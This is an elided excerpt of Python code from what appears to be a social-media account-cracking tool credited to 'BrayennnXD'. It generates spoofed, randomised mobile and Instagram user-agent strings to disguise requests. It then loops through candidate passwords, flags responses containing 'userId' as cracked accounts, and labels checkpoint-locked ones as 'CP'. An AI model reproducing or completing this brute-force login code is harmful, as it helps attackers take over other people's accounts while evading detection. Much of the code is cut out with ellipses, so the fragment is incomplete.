...
def _UserAgent_():
    ...
    USN = str(rc([
          ...
          "Mozilla/5.0 (Linux; Android 9; ASUS_X01AD Build/WW_Phone-202003131222; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 Instagram 139.0.0.33.121 Android (28/9; 320dpi; 720x1369; asus; ASUS_X01AD; ASUS_X01A_1; qcom; fr_FR; 211399341)",
          "Mozilla/5.0 (Linux; Android 8.1.0; ASUS_X00HD Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 Instagram 165.1.0.29.119 Android (27/8.1.0; 320dpi; 720x1280; asus; ASUS_X00HD; ASUS_X00HD_1; qcom; pt_BR; 253447814)",
          "Mozilla/5.0 (Linux; Android 8.0.0; ASUS_X00RD Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 Instagram 165.1.0.29.119 Android (26/8.0.0; 320dpi; 720x1352; asus; ASUS_X00RD; ASUS_X00R_2; qcom; pt_BR; 253447814)"
          ]))
    return USN
...
for x in range(1000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; U; Android 9; th-th; CPH1823 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 OppoBrowser/15.5.1.10"
    dua  = f"Mozilla/5.0 (Linux; Android 10; V1962A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36 VivoBrowser/11.7.12.0"
    tiga  = f"Mozilla/5.0 (Linux; U; Android 9; en-US; ASUS_X01BDA Build/PKQ1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} UCBrowser/13.4.0.1306 Mobile Safari/537.36 {str(rr(2111111,2999999))} js 5.1.1 newfocus lng=ru"
		...
		try: # method API by BrayennnXD 
			for pw in pas:
				...
				if 'userId' in str(PwXyaa):
					...
					print('\n')
					cetak(nel(pepekXD,style='',title='\r[green]Brayennn-Ganteng[white]'))
					...
					print('\n')
					cetak(nel(pepekXD,style='', title='\r[yellow]Brayennn-CP[white]'))
